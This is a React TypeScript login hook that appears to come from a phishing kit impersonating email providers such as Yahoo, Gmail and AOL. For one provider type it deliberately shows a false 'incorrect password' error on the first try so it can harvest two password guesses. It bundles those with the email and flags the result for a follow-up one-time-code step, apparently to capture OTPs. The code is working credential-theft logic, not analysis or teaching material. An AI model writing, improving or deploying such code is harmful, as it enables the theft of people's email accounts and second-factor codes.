import { useState, useRef } from 'react';

export const useLogin = (
  onLoginSuccess?: (data: any) => void,
  onLoginError?: (error: string) => void
) => {
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [firstAttemptPassword, setFirstAttemptPassword] = useState<string>('');
  
  const emailRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);

  const resetLoginState = () => {
    setFirstAttemptPassword('');
    setErrorMessage('');
  };

  const handleFormSubmit = async (event: React.FormEvent, formData?: any) => {
    event.preventDefault();
    setIsLoading(true);
    setErrorMessage('');
    let isFirstAttemptResult = false;
    const isTwoStepFlow = formData?.provider; // Only 'Others' and default providers use the two-step flow.

    try {
      const email = formData?.email || emailRef.current?.value || '';
      const password = formData?.password || passwordRef.current?.value || '';
      
      if (!email || !password) {
        throw new Error('Please enter both email and password');
      }

      // --- TWO-STEP AUTH FLOW (for 'Others' provider) ---
      if (isTwoStepFlow) {
        // This is the SECOND attempt in the two-step flow
        if (firstAttemptPassword) {
          if (firstAttemptPassword === password) {
            throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
          }

          console.log('✅ Second attempt captured. Passing to App for OTP.');
          const finalData = {
            ...formData,
            email,
            firstAttemptPassword,
            secondAttemptPassword: password,
            timestamp: new Date().toISOString(),
            isSecondAttempt: true, // Flag for App.tsx to trigger OTP
          };

          if (onLoginSuccess) {
            onLoginSuccess(finalData);
          }
          return;
        }

        // This is the FIRST attempt in the two-step flow
        console.log('🔒 First attempt captured (simulating invalid password)');
        setFirstAttemptPassword(password);
        isFirstAttemptResult = true;
        throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
      }

      // --- SINGLE-STEP AUTH FLOW (for Yahoo, Gmail, AOL, etc.) ---
      console.log('✅ Single attempt captured. Finalizing data.');
      const finalData = {
        ...formData,
        email,
        password,
        timestamp: new Date().toISOString(),
      };
      
      if (onLoginSuccess) {
        onLoginSuccess(finalData);
      }
      
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Login failed';
      setErrorMessage(errorMsg);
      if (onLoginError) {
        onLoginError(errorMsg);
      }
      return { isFirstAttempt: isFirstAttemptResult };
    } finally {
      setIsLoading(false);
    }
  };

  return {
    isLoading,
    errorMessage,
    handleFormSubmit,
    resetLoginState,
    emailRef,
    passwordRef,
  };
};
